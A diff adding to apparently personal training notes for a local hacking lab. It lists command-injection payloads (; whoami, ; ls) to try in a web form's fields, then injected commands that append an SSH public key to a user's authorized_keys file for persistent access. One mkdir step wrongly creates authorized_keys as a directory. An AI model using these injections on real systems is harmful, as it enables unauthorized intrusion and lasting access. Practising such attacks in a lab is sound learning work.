@@ -118,10 +118,22 @@ I took my online training from the following website
 10.100.28.55
 ```
 ________________________________________________________________________________________________________________
-
-
+## Check the path in the robots.txt: 
+    http://127.0.0.1:10001/net_test/industry_check.php
+## Test different commands in different fields: (path to test)
+```
+; pwd
+; whoami
+; ls -la /home/billybob
+```
 ________________________________________________________________________________________________________________
-
+## Uploading SSH Key: 
+    ; ls -la /home/billybob                                  #check if .ssh exists
+    ; mkdir /home/billybob/.ssh/authorized_keys              #make .ssh in users home folder if it does not exist
+    ssh-keygen -t rsa -b 4096                                #creating ssh private and public keys
+    cat ~/.ssh/id_rsa.pub                                    #copying public key to paste into below command
+    ; echo "your public ssh key here" >> /home/billybob/.ssh/authorized_keys    #placing ssh key in directory
+    ; cat /home/billybob/.ssh/authorized_keys         #verifying the ssh key was emplaced
 
 ________________________________________________________________________________________________________________
 
